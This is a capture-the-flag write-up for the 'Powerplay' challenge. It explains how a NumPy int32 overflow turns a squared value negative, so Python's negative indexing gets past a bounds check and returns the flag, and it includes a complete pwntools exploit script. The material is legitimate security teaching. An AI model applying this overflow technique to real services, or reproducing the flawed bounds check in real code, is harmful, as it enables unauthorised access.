# Powerplay

## Description
Pump yourself up with power  to get an inspirational quote.

## Walkthrough
In this challenge we are given an IP and port to connect to a service and the source code for the service being run.

By checking the service source code we can see that it's a simple game to retrieve inspirational quotes:
```python
import numpy as np
from secret import flag, quotes

prizes = quotes + ['missingno'] * 4 + [flag] * 24

if __name__ == '__main__':
	print('Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!\n')
	player_count = int(input('How many players participate?\n'))
	power = np.zeros(player_count, dtype = np.int32)
	for i in range(player_count):
		power[i] = int(input(f'Player {i}, how strong are you right now?\n'))
	ready = False

	while True:
		print('What do you want to do?\n1) pump up\n2) cash in')
		option = int(input())
		if option == 1:
			power = power**2
			ready = True
		elif option == 2:
			if not ready:
				raise Exception('Nope, too weak')
			for i in range(player_count):
				if power[i] < len(quotes):
					print(f'You got an inspiration: {prizes[power[i]]}')
				exit()
		else:
			raise Exception('What?')
```

The game when connected to, firstly asks how many players we want to play, this is later then used to initialize an array filled with zeros through the help of the python library [NumPy](https://numpy.org/). In this initialization the type of values allowed inside the array are of type 32-bit integers, this can be seen in the following snippet:
```python
player_count = int(input('How many players participate?\n'))
power = np.zeros(player_count, dtype = np.int32)
```

After retrieving the number of players the service requests the user to set each base power level for each player, while doing this the service sets the array values for each player:
```python
for i in range(player_count):
	power[i] = int(input(f'Player {i}, how strong are you right now?\n'))
```

If we request that 3 players are used and that the players base power levels are 1,2,3 respectively then the power array will be as follows: `[1,2,3]`

After setting the power levels the service initiates a control variable named `ready`, this one is used so that the user must at least choose the option `pump up` at least one time before being able to retrieve a quote when choosing the `cash in` option. 
```python
ready = False
...
		elif option == 2:
			if not ready:
				raise Exception('Nope, too weak')
```

If the user chooses to `pump` the players then all of their base levels are equal to their previous base level squared. This can be seen bellow:
```python
		if option == 1:
			power = power**2
			ready = True
``` 

The resulting power levels, with the previous example in mind, will be as follows: `[1,4,9]`

If the user want to retrieve the quotes then the option `cash in` is used, this option firstly checks if the user choose the option `pump up` at least one time and then for each player it check if their power level is bellow the number of quotes in the system. After this check it retrieves the quotes present inside of a `prizes` list. This list is previously initialized with the concatenation of a quotes list, 4 elements named `missingno` (this value is an easter egg to a popular Pokemon [glitch](https://www.nintendo.com/consumer/systems/gameboy/trouble_specificgame.jsp#missingno)) and finally 24 elements that are the flag we are looking for. To retrieve the quotes the service uses the current player base power level as the index for the prizes and due to the previous check of the players power level being bellow the number of quotes in the system, the intended behavior is only retrieving quotes.
```python
prizes = quotes + ['missingno'] * 4 + [flag] * 24
...
		elif option == 2:
			if not ready:
				raise Exception('Nope, too weak')
			for i in range(player_count):
				if power[i] < len(quotes):
					print(f'You got an inspiration: {prizes[power[i]]}')
				exit()
```

Although the flag values seem unreachable, the service as a flaw that allows us to retrieve them. While initializing the power array the data type used is 32-bit integers, this choice seems harmless but when an integer is big enough to be close to it's standard limit, in this case the 32 bit integer maximum is `2^31−1`, when incremented, the value will loop over and be set as the minimum value of that given standard, in this case `−2^31`, this problem is named [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow). This bug causes a logic problem in the service, this is due to Python allowing negative indexes in list to [retrieve values from reversed list](https://www.geeksforgeeks.org/python-negative-index-of-element-in-list/), allowing therefore the retrieval of values besides quotes, even if the quotes size check is used (`power[i] < len(quotes)`).

To exploit this we can use only one player, after setting it's base value we should try to increment it until it's negative and then choose the option to retrieve the quote, if we want the value flag we should also be careful that only 24 flags are present in the `prizes` list, so we should try to overflow the integer no more than `-24`, to due this in a faster way we can just brute force locally and then with the correct player's base levels and number of `pump up`'s we can retrieve the flag remotely. This can be seen in the program bellow:
```python
from pwn import *
import numpy as np
context.log_level='critical'

# Remote Server
host = '<IP>'
port = <PORT>

# Helper function to interact with the process
def getFlag(base, pumps):
    # Step 0: Start the remote connection
    r = remote(host, port)

    # Step 1: Input the number of players (1)
    r.recvuntil(b'How many players participate?\n')
    r.sendline(b'1')  # We are simulating 1 player

    # Step 2: Set the initial power
    r.recvuntil(f'Player 0, how strong are you right now?\n'.encode())
    r.sendline(str(base).encode())

    # Step 3: Pump up the power 'pump' times by choosing the "pump up" option
    for pump in range(pumps):
        r.recvuntil(b'What do you want to do?\n1) pump up\n2) cash in')
        r.sendline(b'1')  # Option to pump up (square the power)

    # Step 4: Choose "cash in" to receive the prize
    r.recvuntil(b'What do you want to do?\n1) pump up\n2) cash in')
    r.sendline(b'2')  # Option to cash in (receive a prize)

    # Step 5: Receive the prize
    output = r.recvall()  # Receive the full output of the game

    # Step 6: Close the remote connection after we are done
    r.close()

    # Retrieve flag from quote
    flag = re.search(r"ENO\{.*?\}", output.decode()).group(0)
    return flag

def getBaseAndPumps():
    # Iterate over possible base values
    for base in range(-34710000, -99999999, -1):
        power = np.int32(base)
        for pump in range(2):
            power = np.int32(power ** 2)  
            if power < 0 and power > -24:
                return base, pump + 1 
    return None, None


if __name__ == '__main__':
    # Get base and pumps
    base, pumps = getBaseAndPumps()
    if base is None or pumps is None:
        print("[!] No valid base and pumps found.")
        exit()

    # Retrieve flag
    print(f'[i] Flag: {getFlag(base, pumps)}')
```
